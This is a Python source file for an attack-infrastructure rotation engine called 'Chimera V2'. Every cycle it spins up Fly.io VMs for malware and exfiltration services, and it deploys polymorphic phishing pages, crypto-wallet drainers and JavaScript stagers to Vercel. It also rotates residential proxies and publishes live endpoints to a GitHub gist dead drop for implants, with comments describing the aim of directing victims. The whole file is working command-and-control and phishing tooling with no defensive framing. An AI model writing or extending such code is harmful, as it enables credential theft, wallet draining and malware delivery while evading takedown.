# chimera_core_v2.py — Updated rotation engine that deploys payloads
# Replaces the original chimera_core.py

import time
import threading
import secrets
import logging
from datetime import datetime, timezone
from typing import Any, Optional

from core.fly_provisioner import FlyProvisioner
from core.vercel_deployer import VercelDeployer
from core.deaddrop import DeadDrop
from core.proxy_rotator import ProxyRotator
from core.payload_registry import PayloadRegistry
from core.polymorphic_renderer import PolymorphicRenderer

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(message)s")


class ChimeraRotationV2:
    """
    Payload-aware rotation engine.
    Deploys both static payloads (Vercel) and dynamic payloads (Fly VM)
    on every rotation cycle, with polymorphic variation per deployment.
    """

    def __init__(self, config: dict[str, Any], payload_registry: PayloadRegistry) -> None:
        self.fly = FlyProvisioner(
            api_token=str(config["fly_api_token"]),
            org_slug=str(config["fly_org"]),
            region=str(config["fly_region"]),
            app_base=str(config["fly_app_base"]),
        )
        self.vercel = VercelDeployer(
            api_token=str(config["vercel_api_token"]),
            team_slug=str(config["vercel_team"]),
            project_base=str(config["vercel_project_base"]),
        )
        self.drop = DeadDrop(
            gist_token=str(config["github_token"]),
            gist_id=str(config["gist_id"]),
        )
        self.proxies = ProxyRotator(
            provider=str(config["proxy_provider"]),
            username=str(config["proxy_user"]),
            password=str(config["proxy_pass"]),
            endpoint=str(config["proxy_endpoint"]),
        )
        self.registry = payload_registry
        self.cycle_minutes: int = int(config.get("cycle_minutes", 60))
        self._current: Optional[dict[str, Any]] = None
        self._previous: Optional[dict[str, Any]] = None
        self._lock = threading.Lock()
        self._running = False

    def _rotate_cycle(self) -> dict[str, Any]:
        ts = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
        deployment_seed = secrets.token_hex(16)  # unique polymorphic seed per cycle
        renderer = PolymorphicRenderer(seed=deployment_seed)
        session_key = secrets.token_hex(16)

        # 1. Provision Fly VM (for dynamic payloads: malware API, exfil, etc.)
        fly_payloads = self.registry.get_fly_payloads()
        fly_session: Optional[dict[str, Any]] = None
        if fly_payloads:
            logging.info(
                f"[cycle {ts}] Provisioning Fly VM for {len(fly_payloads)} dynamic payloads..."
            )
            fly_session = self.fly.provision_vm(suffix=ts)
            # Inject payload config into VM env
            fly_session["session_key"] = session_key
            fly_session["deployment_seed"] = deployment_seed

        # 2. Deploy Vercel pages (for static payloads: phishing, drainer, stager)
        vercel_payloads = self.registry.get_vercel_payloads()
        vercel_deployments: list[dict[str, Any]] = []
        for pdef in vercel_payloads:
            logging.info(
                f"[cycle {ts}] Deploying Vercel payload: {pdef.id} ({pdef.payload_type})..."
            )

            if pdef.payload_type == "phishing":
                # Render phishing page with polymorphic variation
                html = renderer.render_phishing(
                    pdef,
                    session_key,
                    f"https://{fly_session['ip']}:8443/api" if fly_session else "",
                )
                vdep = self.vercel.deploy_custom(
                    files={"index.html": html},
                    suffix=f"{ts}-{pdef.id}",
                )
                vercel_deployments.append(vdep)

            elif pdef.payload_type == "drainer":
                html = renderer.render_drainer(
                    pdef,
                    session_key,
                    f"https://{fly_session['ip']}:8443/api" if fly_session else "",
                )
                vdep = self.vercel.deploy_custom(
                    files={"index.html": html},
                    suffix=f"{ts}-{pdef.id}",
                )
                vercel_deployments.append(vdep)

            elif pdef.payload_type == "stager":
                js = renderer.render_stager(
                    pdef,
                    session_key,
                    f"https://{fly_session['ip']}:8443/stage2" if fly_session else "",
                )
                vdep = self.vercel.deploy_custom(
                    files={"index.html": "<html></html>", "app.js": js},
                    suffix=f"{ts}-{pdef.id}",
                )
                vercel_deployments.append(vdep)

            elif pdef.payload_type == "custom":
                files: dict[str, str] = {}
                if pdef.custom_html:
                    files["index.html"] = pdef.custom_html
                if pdef.custom_js:
                    files["app.js"] = pdef.custom_js
                vdep = self.vercel.deploy_custom(
                    files=files,
                    suffix=f"{ts}-{pdef.id}",
                )
                vercel_deployments.append(vdep)

        # 3. Rotate residential proxy
        logging.info(f"[cycle {ts}] Rotating residential proxy pool...")
        proxy_session = self.proxies.rotate_pool()

        # 4. Build dead drop config
        #    Include ALL active endpoints so the implant knows where to go
        endpoints: dict[str, str] = {}
        if fly_session:
            if vercel_deployments:
                endpoints["api"] = f"https://{vercel_deployments[0]['deployment_url']}/api"
            else:
                endpoints["api"] = f"http://{fly_session['ip']}:8443"
        for vdep in vercel_deployments:
            # Map payload ID to its Vercel URL
            # The implant or operator uses these URLs to direct victims
            endpoints[vdep["project_name"]] = f"https://{vdep['deployment_url']}"

        new_config: dict[str, Any] = {
            "v": 2,
            "ts": ts,
            "key": session_key,
            "seed": deployment_seed,
            "endpoints": endpoints,
            "px": proxy_session["rotation_token"],
        }

        logging.info(f"[cycle {ts}] Updating dead drop with {len(endpoints)} endpoints...")
        self.drop.update(new_config)

        return {
            "fly": fly_session,
            "vercel": vercel_deployments,
            "proxy": proxy_session,
            "config": new_config,
            "ts": ts,
        }

    def _teardown(self, session: Optional[dict[str, Any]]) -> None:
        if not session:
            return
        ts = str(session.get("ts", "unknown"))
        if session.get("fly"):
            logging.info(f"[teardown {ts}] Destroying Fly VM...")
            fly_info = session["fly"]
            self.fly.destroy_vm(str(fly_info["app_name"]), str(fly_info["vm_id"]))
        for vdep in session.get("vercel", []):
            logging.info(f"[teardown {ts}] Removing Vercel deployment {vdep['deployment_id']}...")
            self.vercel.destroy_deployment(str(vdep["deployment_id"]))
        logging.info(f"[teardown {ts}] Complete.")

    @property
    def current(self) -> Optional[dict[str, Any]]:
        """Public read-only accessor for the current rotation session."""
        return self._current

    def start(self) -> None:
        self._running = True
        logging.info("Chimera V2 rotation engine started.")
        while self._running:
            with self._lock:
                try:
                    new_session = self._rotate_cycle()
                    self._teardown(self._previous)
                    self._previous = self._current
                    self._current = new_session
                    endpoints = new_session["config"]["endpoints"]
                    for name, url in endpoints.items():
                        logging.info(f"  Active endpoint [{name}]: {url}")
                except Exception as e:
                    logging.error(f"Rotation failed: {e}")
            time.sleep(self.cycle_minutes * 60)

    def stop(self) -> None:
        self._running = False
        if self._current:
            self._teardown(self._current)
        if self._previous:
            self._teardown(self._previous)

